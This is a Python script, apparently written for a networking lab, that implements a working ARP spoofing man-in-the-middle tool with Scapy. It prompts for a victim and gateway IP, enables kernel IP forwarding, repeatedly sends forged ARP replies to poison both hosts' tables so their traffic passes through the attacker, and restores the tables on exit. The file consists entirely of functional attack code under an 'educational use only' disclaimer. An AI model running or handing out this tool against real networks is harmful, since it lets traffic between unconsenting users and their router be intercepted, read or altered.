#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tool: D31B1 ARP Spoofer (MitM)
Author: Junior (Deivi) - D31B1
Description: Advanced ARP Spoofing tool with auto-forwarding and clean exit.
             Intercepts traffic between a Target and Gateway.
Disclaimer: EDUCATIONAL USE ONLY. Authorized labs/networks only.
"""

import sys
import time
import os
from scapy.all import *

# --- CONFIGURACIÓN ---
TOOL_NAME = "D31B1 ARP POISON"
VERSION = "1.1.0 (Fixed)"

def banner():
    print("\n" + "="*60)
    print(f" 🕵️‍♂️  {TOOL_NAME} - {VERSION}  🕵️‍♂️")
    print(f"     >> Created by: Junior (D31B1)")
    print(f"     >> Mode: Man-in-the-Middle (Active)")
    print("="*60)

def enable_forwarding():
    """ Habilita el reenvío de paquetes en Linux (Kali) para no cortar el internet """
    print("[*] Enabling IP Forwarding...")
    if os.name == 'nt':
        print("[!] Windows detected: Please enable IP Routing manually.")
    else:
        # Habilitar ip_forward en el kernel de Linux
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    """ Obtiene la MAC de una IP enviando una solicitud ARP Broadcast """
    # Creamos un paquete Ethernet Broadcast + ARP Request
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    # Enviamos y esperamos respuesta (srp = send receive packet layer 2)
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    if answered_list:
        # Retorna la MAC del primer que respondió
        return answered_list[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """ Envía el paquete ARP falso (Veneno) """
    target_mac = get_mac(target_ip)
    if not target_mac:
        # Si no conseguimos la MAC, no enviamos nada para evitar errores
        return

    # --- FIX IMPORTANTE ---
    # Construimos el paquete completo: Ethernet Header + ARP Header
    # Esto evita los WARNINGS de Scapy y asegura que la VPCS lo acepte.
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Usamos sendp (Send Packet Layer 2)
    sendp(packet, verbose=False)

def restore(dest_ip, source_ip):
    """ Restaura la tabla ARP a la normalidad al cerrar """
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    
    if dest_mac and source_mac:
        # Enviamos el paquete correcto para "curar" la tabla ARP
        packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(packet, count=4, verbose=False)

def main():
    banner()

    # 1. Solicitar IPs (Recuerda usar las de tu matrícula: 20.24.20.X)
    try:
        target_ip = input("\n[?] Target IP (Victim): ").strip()
        gateway_ip = input("[?] Gateway IP (Router): ").strip()
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        sys.exit()

    if not target_ip or not gateway_ip:
        print("[!] Error: You must provide both IPs.")
        sys.exit(1)

    # 2. Preparar ataque
    enable_forwarding()
    print(f"\n[*] Target: {target_ip} | Gateway: {gateway_ip}")
    print("[*] Resolving MAC addresses (Wait a moment)...")

    try:
        # Verificamos que las MACs se puedan obtener antes de empezar
        victim_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if not victim_mac or not gateway_mac:
            print("[-] Error: Could not find MAC address for Target or Gateway.")
            print("    Check connectivity (Are they ON? Can you ping them?)")
            sys.exit(1)

        print(f"[+] MACs Found! Victim: {victim_mac} | Gateway: {gateway_mac}")
        print("\n[+] 💉 POISONING STARTED! (Intercepting traffic...)")
        print("[!] Press CTRL+C to stop and restore network.")
        
        packets_sent = 0
        while True:
            # Engañar a la víctima: "Yo (Kali) soy el Router"
            spoof(target_ip, gateway_ip)
            # Engañar al Router: "Yo (Kali) soy la víctima"
            spoof(gateway_ip, target_ip)
            
            packets_sent += 2
            sys.stdout.write(f"\r[+] Packets Sent: {packets_sent}")
            sys.stdout.flush()
            time.sleep(2) # Intervalo de 2 segundos para no saturar

    except KeyboardInterrupt:
        print("\n\n[!] Detected CTRL+C. Stopping attack...")
        print("[*] Restoring ARP Tables (Cleaning up)...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[*] Network restored. Exiting.")

if __name__ == "__main__":
    main()
